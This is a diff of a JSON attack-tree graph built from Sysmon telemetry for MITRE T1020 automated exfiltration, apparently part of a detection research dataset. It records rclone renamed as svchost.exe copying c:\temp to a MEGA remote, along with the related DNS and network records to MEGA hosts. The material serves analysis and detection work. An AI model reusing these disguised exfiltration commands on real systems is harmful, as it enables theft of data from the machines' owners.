@@ -2,7 +2,7 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1020",
-  "generated_at_utc": "2026-05-05T17:01:02.144330+00:00",
+  "generated_at_utc": "2026-05-06T14:33:26.348279+00:00",
   "source_file": "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1020\\windows-sysmon.log",
   "source_files": [
     "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1020\\windows-sysmon.log"
@@ -46,107 +46,27 @@
   },
   "nodes": [
     {
-      "id": "network:type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;::tcp",
-      "label": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;",
-        "destination_port": "",
-        "protocol": "tcp",
-        "domain_name": "g.api.mega.co.nz",
-        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\svchost.exe",
-        "parent_process_id": "Process:{7B03F3B2-6BA0-609D-8A53-00000000BA01}:1",
-        "event_id": "22",
-        "id": "network:type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;::tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;",
-        "name": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;"
-      }
-    },
-    {
-      "id": "Process:{7B03F3B2-6BE2-609D-9353-00000000BA01}:1",
+      "id": "Process:{7B03F3B2-6BEE-609D-9A53-00000000BA01}:1",
       "label": "rsync for cloud storage",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "rsync for cloud storage",
-        "guid": "{7B03F3B2-6BE2-609D-9353-00000000BA01}",
-        "pid": "8008",
-        "image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\svchost.exe",
-        "command_line": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\svchost.exe  copy c:\\temp mega:backup -q --ignore-existing --auto-confirm --multi-thread-streams --transfers 12",
+        "guid": "{7B03F3B2-6BEE-609D-9A53-00000000BA01}",
+        "pid": "5252",
+        "image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe",
+        "command_line": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe  --progress copy c:\\temp mega:backup",
         "original_file_name": "rclone.exe",
         "image_hash": "MD5=22BBE1747933531E9C240E0DB86268E2,SHA256=53AE3567A34097F29011D752F1D3AFAB8F92BEB36A8D6A5DF5C1D4B12EDC1703,IMPHASH=2F1ADC02EEC2C8681D1612C9A43CED84",
-        "command_hash": "7fb8e8570662d55a6a01766c977cd1db78262e20497d8c34c84eb0b0b8922532",
+        "command_hash": "215d75fb79177dbf0b13f167316e7f6401fc6b9776f8571f11554ddb3f1a3667",
         "parent_process_id": "Process:{7B03F3B2-3954-609D-A74C-00000000BA01}:1",
         "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{7B03F3B2-6BE2-609D-9353-00000000BA01}:1",
+        "id": "Process:{7B03F3B2-6BEE-609D-9A53-00000000BA01}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "rsync for cloud storage",
         "name": "rsync for cloud storage"
-      }
-    },
-    {
-      "id": "network:66.203.125.12:443:tcp",
-      "label": "66.203.125.12",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "66.203.125.12",
-        "destination_port": "443",
-        "protocol": "tcp",
-        "domain_name": "bt2.api.mega.co.nz",
-        "source_image_path": "%programfiles%\\mozilla firefox\\firefox.exe",
-        "parent_process_id": "Process:{7B03F3B2-37B7-609D-644C-00000000BA01}:1",
-        "event_id": "3",
-        "id": "network:66.203.125.12:443:tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "66.203.125.12",
-        "name": "66.203.125.12"
-      }
-    },
-    {
-      "id": "network:66.203.125.14:443:tcp",
-      "label": "66.203.125.14",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "66.203.125.14",
-        "destination_port": "443",
-        "protocol": "tcp",
-        "domain_name": "-",
-        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe",
-        "parent_process_id": "Process:{7B03F3B2-6B7E-609D-8953-00000000BA01}:1",
-        "event_id": "3",
-        "id": "network:66.203.125.14:443:tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "66.203.125.14",
-        "name": "66.203.125.14"
-      }
-    },
-    {
-      "id": "network:type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;::tcp",
-      "label": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;",
-        "destination_port": "",
-        "protocol": "tcp",
-        "domain_name": "g.api.mega.co.nz",
-        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe",
-        "parent_process_id": "Process:{7B03F3B2-6B7E-609D-8953-00000000BA01}:1",
-        "event_id": "22",
-        "id": "network:type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;::tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;",
-        "name": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;"
       }
     },
     {
@@ -171,6 +91,30 @@
         "entity_class": "ProcessEntity",
         "display_name": "rclone.exe",
         "name": "rclone.exe"
+      }
+    },
+    {
+      "id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
+      "label": "explorer.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{7B03F3B2-31A0-609C-522D-00000000BA01}",
+        "pid": "1876",
+        "image_path": "%windir%\\explorer.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "explorer.exe",
+        "name": "explorer.exe"
       }
     },
     {
@@ -222,101 +166,23 @@
       }
     },
     {
-      "id": "File:6ad5912755ad201bc6f33fb5d1ad284edf6d4feebbe6ce711f41bbfb55d61a63:11",
-      "label": "rclone - copy.exe:zone.identifier",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone - copy.exe:zone.identifier",
-        "source_image_path": "%windir%\\explorer.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
-        "event_id": "11",
-        "id": "File:6ad5912755ad201bc6f33fb5d1ad284edf6d4feebbe6ce711f41bbfb55d61a63:11",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "rclone - copy.exe:zone.identifier",
-        "name": "rclone - copy.exe:zone.identifier"
-      }
-    },
-    {
-      "id": "Process:{7B03F3B2-6BEE-609D-9A53-00000000BA01}:1",
-      "label": "rsync for cloud storage",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "rsync for cloud storage",
-        "guid": "{7B03F3B2-6BEE-609D-9A53-00000000BA01}",
-        "pid": "5252",
-        "image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe",
-        "command_line": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe  --progress copy c:\\temp mega:backup",
-        "original_file_name": "rclone.exe",
-        "image_hash": "MD5=22BBE1747933531E9C240E0DB86268E2,SHA256=53AE3567A34097F29011D752F1D3AFAB8F92BEB36A8D6A5DF5C1D4B12EDC1703,IMPHASH=2F1ADC02EEC2C8681D1612C9A43CED84",
-        "command_hash": "215d75fb79177dbf0b13f167316e7f6401fc6b9776f8571f11554ddb3f1a3667",
-        "parent_process_id": "Process:{7B03F3B2-3954-609D-A74C-00000000BA01}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{7B03F3B2-6BEE-609D-9A53-00000000BA01}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rsync for cloud storage",
-        "name": "rsync for cloud storage"
-      }
-    },
-    {
-      "id": "File:6ad5912755ad201bc6f33fb5d1ad284edf6d4feebbe6ce711f41bbfb55d61a63:15",
-      "label": "rclone - copy.exe:zone.identifier",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone - copy.exe:zone.identifier",
-        "source_image_path": "%windir%\\explorer.exe",
-        "content_hash": "MD5=FBCCF14D504B7B2DBCB5A5BDA75BD93B,SHA256=EACD09517CE90D34BA562171D15AC40D302F0E691B439F91BE1B6406E25F5913,IMPHASH=00000000000000000000000000000000",
-        "parent_process_id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
-        "event_id": "15",
-        "id": "File:6ad5912755ad201bc6f33fb5d1ad284edf6d4feebbe6ce711f41bbfb55d61a63:15",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "rclone - copy.exe:zone.identifier",
-        "name": "rclone - copy.exe:zone.identifier"
-      }
-    },
-    {
-      "id": "network:fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;::tcp",
-      "label": "fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;",
+      "id": "network:66.203.125.14:443:tcp",
+      "label": "66.203.125.14",
       "type": "network",
       "group": "Network",
       "properties": {
-        "destination_ip": "fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;",
-        "destination_port": "",
+        "destination_ip": "66.203.125.14",
+        "destination_port": "443",
         "protocol": "tcp",
-        "domain_name": "win-dc-18.attackrange.local",
+        "domain_name": "-",
         "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe",
         "parent_process_id": "Process:{7B03F3B2-6B7E-609D-8953-00000000BA01}:1",
-        "event_id": "22",
-        "id": "network:fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;::tcp",
+        "event_id": "3",
+        "id": "network:66.203.125.14:443:tcp",
         "type": "Network",
         "entity_class": "NetworkEntity",
-        "display_name": "fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;",
-        "name": "fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;"
-      }
-    },
-    {
-      "id": "File:6280b4d650eeb80e567ad8926f5cc40e4ce55789da08a9a2dc7a067fb7764a35:11",
-      "label": "rclone - copy.exe",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone - copy.exe",
-        "source_image_path": "%windir%\\explorer.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
-        "event_id": "11",
-        "id": "File:6280b4d650eeb80e567ad8926f5cc40e4ce55789da08a9a2dc7a067fb7764a35:11",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "rclone - copy.exe",
-        "name": "rclone - copy.exe"
+        "display_name": "66.203.125.14",
+        "name": "66.203.125.14"
       }
     },
     {
@@ -344,24 +210,6 @@
       }
     },
     {
-      "id": "File:ca3280538e8ac79e6aadc4c6293d022208d6cf312819009e7a420d3fb2567d49:7",
-      "label": "cryptdll.dll",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%system32%\\cryptdll.dll",
-        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe",
-        "content_hash": "MD5=4B31902F1E0B79CE7E46D9877647C1CC,SHA256=8925892119315293C49D09A26191149660934BF1E5D3D023722E90339ADA38AA,IMPHASH=CAB6D6025DF08B0D0BC6259D625E2778",
-        "parent_process_id": "Process:{7B03F3B2-6B7E-609D-8953-00000000BA01}:1",
-        "event_id": "7",
-        "id": "File:ca3280538e8ac79e6aadc4c6293d022208d6cf312819009e7a420d3fb2567d49:7",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "cryptdll.dll",
-        "name": "cryptdll.dll"
-      }
-    },
-    {
       "id": "Process:{7B03F3B2-6B7E-609D-8953-00000000BA01}:1",
       "label": "rclone.exe",
       "type": "process",
@@ -386,23 +234,79 @@
       }
     },
     {
-      "id": "network:::ffff:66.203.125.32;::tcp",
-      "label": "::ffff:66.203.125.32;",
+      "id": "network:66.203.125.11:443:tcp",
+      "label": "66.203.125.11",
       "type": "network",
       "group": "Network",
       "properties": {
-        "destination_ip": "::ffff:66.203.125.32;",
+        "destination_ip": "66.203.125.11",
+        "destination_port": "443",
+        "protocol": "tcp",
+        "domain_name": "bt1.api.mega.co.nz",
+        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\svchost.exe",
+        "parent_process_id": "Process:{7B03F3B2-6BA0-609D-8A53-00000000BA01}:1",
+        "event_id": "3",
+        "id": "network:66.203.125.11:443:tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "66.203.125.11",
+        "name": "66.203.125.11"
+      }
+    },
+    {
+      "id": "File:6ad5912755ad201bc6f33fb5d1ad284edf6d4feebbe6ce711f41bbfb55d61a63:15",
+      "label": "rclone - copy.exe:zone.identifier",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone - copy.exe:zone.identifier",
+        "source_image_path": "%windir%\\explorer.exe",
+        "content_hash": "MD5=FBCCF14D504B7B2DBCB5A5BDA75BD93B,SHA256=EACD09517CE90D34BA562171D15AC40D302F0E691B439F91BE1B6406E25F5913,IMPHASH=00000000000000000000000000000000",
+        "parent_process_id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
+        "event_id": "15",
+        "id": "File:6ad5912755ad201bc6f33fb5d1ad284edf6d4feebbe6ce711f41bbfb55d61a63:15",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "rclone - copy.exe:zone.identifier",
+        "name": "rclone - copy.exe:zone.identifier"
+      }
+    },
+    {
+      "id": "network:type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;::tcp",
+      "label": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;",
         "destination_port": "",
         "protocol": "tcp",
-        "domain_name": "w.api.mega.co.nz",
+        "domain_name": "g.api.mega.co.nz",
         "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\svchost.exe",
         "parent_process_id": "Process:{7B03F3B2-6BA0-609D-8A53-00000000BA01}:1",
         "event_id": "22",
-        "id": "network:::ffff:66.203.125.32;::tcp",
+        "id": "network:type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;::tcp",
         "type": "Network",
         "entity_class": "NetworkEntity",
-        "display_name": "::ffff:66.203.125.32;",
-        "name": "::ffff:66.203.125.32;"
+        "display_name": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;",
+        "name": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.11;::ffff:66.203.125.13;::ffff:66.203.125.14;::ffff:66.203.125.15;::ffff:66.203.125.12;"
+      }
+    },
+    {
+      "id": "File:6280b4d650eeb80e567ad8926f5cc40e4ce55789da08a9a2dc7a067fb7764a35:15",
+      "label": "rclone - copy.exe",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone - copy.exe",
+        "source_image_path": "%windir%\\explorer.exe",
+        "content_hash": "MD5=22BBE1747933531E9C240E0DB86268E2,SHA256=53AE3567A34097F29011D752F1D3AFAB8F92BEB36A8D6A5DF5C1D4B12EDC1703,IMPHASH=2F1ADC02EEC2C8681D1612C9A43CED84",
+        "parent_process_id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
+        "event_id": "15",
+        "id": "File:6280b4d650eeb80e567ad8926f5cc40e4ce55789da08a9a2dc7a067fb7764a35:15",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "rclone - copy.exe",
+        "name": "rclone - copy.exe"
       }
     },
     {
@@ -430,27 +334,156 @@
       }
     },
     {
-      "id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
-      "label": "explorer.exe",
+      "id": "network:type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;::tcp",
+      "label": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;",
+        "destination_port": "",
+        "protocol": "tcp",
+        "domain_name": "g.api.mega.co.nz",
+        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe",
+        "parent_process_id": "Process:{7B03F3B2-6B7E-609D-8953-00000000BA01}:1",
+        "event_id": "22",
+        "id": "network:type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;::tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;",
+        "name": "type:  5 lu.api.mega.co.nz;::ffff:66.203.125.14;::ffff:66.203.125.12;::ffff:66.203.125.13;::ffff:66.203.125.15;::ffff:66.203.125.11;"
+      }
+    },
+    {
+      "id": "Process:{7B03F3B2-6BE2-609D-9353-00000000BA01}:1",
+      "label": "rsync for cloud storage",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "",
-        "guid": "{7B03F3B2-31A0-609C-522D-00000000BA01}",
-        "pid": "1876",
-        "image_path": "%windir%\\explorer.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
+        "process_name": "rsync for cloud storage",
+        "guid": "{7B03F3B2-6BE2-609D-9353-00000000BA01}",
+        "pid": "8008",
+        "image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\svchost.exe",
+        "command_line": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\svchost.exe  copy c:\\temp mega:backup -q --ignore-existing --auto-confirm --multi-thread-streams --transfers 12",
+        "original_file_name": "rclone.exe",
+        "image_hash": "MD5=22BBE1747933531E9C240E0DB86268E2,SHA256=53AE3567A34097F29011D752F1D3AFAB8F92BEB36A8D6A5DF5C1D4B12EDC1703,IMPHASH=2F1ADC02EEC2C8681D1612C9A43CED84",
+        "command_hash": "7fb8e8570662d55a6a01766c977cd1db78262e20497d8c34c84eb0b0b8922532",
+        "parent_process_id": "Process:{7B03F3B2-3954-609D-A74C-00000000BA01}:1",
+        "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
+        "id": "Process:{7B03F3B2-6BE2-609D-9353-00000000BA01}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "explorer.exe",
-        "name": "explorer.exe"
+        "display_name": "rsync for cloud storage",
+        "name": "rsync for cloud storage"
+      }
+    },
+    {
+      "id": "network:fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;::tcp",
+      "label": "fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;",
+        "destination_port": "",
+        "protocol": "tcp",
+        "domain_name": "win-dc-18.attackrange.local",
+        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe",
+        "parent_process_id": "Process:{7B03F3B2-6B7E-609D-8953-00000000BA01}:1",
+        "event_id": "22",
+        "id": "network:fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;::tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;",
+        "name": "fe80::b173:2d3f:cb87:36ed;::ffff:10.0.1.14;"
+      }
+    },
+    {
+      "id": "network:66.203.125.12:443:tcp",
+      "label": "66.203.125.12",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "66.203.125.12",
+        "destination_port": "443",
+        "protocol": "tcp",
+        "domain_name": "bt2.api.mega.co.nz",
+        "source_image_path": "%programfiles%\\mozilla firefox\\firefox.exe",
+        "parent_process_id": "Process:{7B03F3B2-37B7-609D-644C-00000000BA01}:1",
+        "event_id": "3",
+        "id": "network:66.203.125.12:443:tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "66.203.125.12",
+        "name": "66.203.125.12"
+      }
+    },
+    {
+      "id": "network:::ffff:66.203.125.32;::tcp",
+      "label": "::ffff:66.203.125.32;",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "::ffff:66.203.125.32;",
+        "destination_port": "",
+        "protocol": "tcp",
+        "domain_name": "w.api.mega.co.nz",
+        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\svchost.exe",
+        "parent_process_id": "Process:{7B03F3B2-6BA0-609D-8A53-00000000BA01}:1",
+        "event_id": "22",
+        "id": "network:::ffff:66.203.125.32;::tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "::ffff:66.203.125.32;",
+        "name": "::ffff:66.203.125.32;"
+      }
+    },
+    {
+      "id": "File:ca3280538e8ac79e6aadc4c6293d022208d6cf312819009e7a420d3fb2567d49:7",
+      "label": "cryptdll.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\cryptdll.dll",
+        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone.exe",
+        "content_hash": "MD5=4B31902F1E0B79CE7E46D9877647C1CC,SHA256=8925892119315293C49D09A26191149660934BF1E5D3D023722E90339ADA38AA,IMPHASH=CAB6D6025DF08B0D0BC6259D625E2778",
+        "parent_process_id": "Process:{7B03F3B2-6B7E-609D-8953-00000000BA01}:1",
+        "event_id": "7",
+        "id": "File:ca3280538e8ac79e6aadc4c6293d022208d6cf312819009e7a420d3fb2567d49:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "cryptdll.dll",
+        "name": "cryptdll.dll"
+      }
+    },
+    {
+      "id": "Technique:T1020",
+      "label": "T1020",
+      "type": "technique",
+      "group": "Technique",
+      "properties": {
+        "id": "Technique:T1020",
+        "name": "T1020",
+        "display_name": "T1020",
+        "type": "Technique",
+        "entity_class": "Technique"
+      }
+    },
+    {
+      "id": "File:6280b4d650eeb80e567ad8926f5cc40e4ce55789da08a9a2dc7a067fb7764a35:11",
+      "label": "rclone - copy.exe",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone - copy.exe",
+        "source_image_path": "%windir%\\explorer.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
+        "event_id": "11",
+        "id": "File:6280b4d650eeb80e567ad8926f5cc40e4ce55789da08a9a2dc7a067fb7764a35:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "rclone - copy.exe",
+        "name": "rclone - copy.exe"
       }
     },
     {
@@ -478,54 +511,21 @@
       }
     },
     {
-      "id": "network:66.203.125.11:443:tcp",
-      "label": "66.203.125.11",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "66.203.125.11",
-        "destination_port": "443",
-        "protocol": "tcp",
-        "domain_name": "bt1.api.mega.co.nz",
-        "source_image_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\svchost.exe",
-        "parent_process_id": "Process:{7B03F3B2-6BA0-609D-8A53-00000000BA01}:1",
-        "event_id": "3",
-        "id": "network:66.203.125.11:443:tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "66.203.125.11",
-        "name": "66.203.125.11"
-      }
-    },
-    {
-      "id": "Technique:T1020",
-      "label": "T1020",
-      "type": "technique",
-      "group": "Technique",
-      "properties": {
-        "id": "Technique:T1020",
-        "name": "T1020",
-        "display_name": "T1020",
-        "type": "Technique",
-        "entity_class": "Technique"
-      }
-    },
-    {
-      "id": "File:6280b4d650eeb80e567ad8926f5cc40e4ce55789da08a9a2dc7a067fb7764a35:15",
-      "label": "rclone - copy.exe",
+      "id": "File:6ad5912755ad201bc6f33fb5d1ad284edf6d4feebbe6ce711f41bbfb55d61a63:11",
+      "label": "rclone - copy.exe:zone.identifier",
       "type": "file",
       "group": "File",
       "properties": {
-        "file_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone - copy.exe",
+        "file_path": "%userprofile%\\downloads\\rclone-v1.55.1-windows-amd64\\rclone-v1.55.1-windows-amd64\\rclone - copy.exe:zone.identifier",
         "source_image_path": "%windir%\\explorer.exe",
-        "content_hash": "MD5=22BBE1747933531E9C240E0DB86268E2,SHA256=53AE3567A34097F29011D752F1D3AFAB8F92BEB36A8D6A5DF5C1D4B12EDC1703,IMPHASH=2F1ADC02EEC2C8681D1612C9A43CED84",
+        "content_hash": "",
         "parent_process_id": "Process:{7B03F3B2-31A0-609C-522D-00000000BA01}:1",
-        "event_id": "15",
-        "id": "File:6280b4d650eeb80e567ad8926f5cc40e4ce55789da08a9a2dc7a067fb7764a35:15",
+        "event_id": "11",
+        "id": "File:6ad5912755ad201bc6f33fb5d1ad284edf6d4feebbe6ce711f41bbfb55d61a63:11",
         "type": "File",
         "entity_class": "FileEntity",
-        "display_name": "rclone - copy.exe",
-        "name": "rclone - copy.exe"
+        "display_name": "rclone - copy.exe:zone.identifier",
+        "name": "rclone - copy.exe:zone.identifier"
       }
     }
   ],
@@ -541,7 +541,7 @@
       "properties": {
         "action": "Network Connection",
         "event_id": "3",
-        "timestamp": "2026-05-05T17:01:01.835664+00:00"
+        "timestamp": "2026-05-06T14:33:26.142179+00:00"
       }
     },
     {
@@ -555,7 +555,7 @@
       "properties": {
         "action": "Image Loaded",
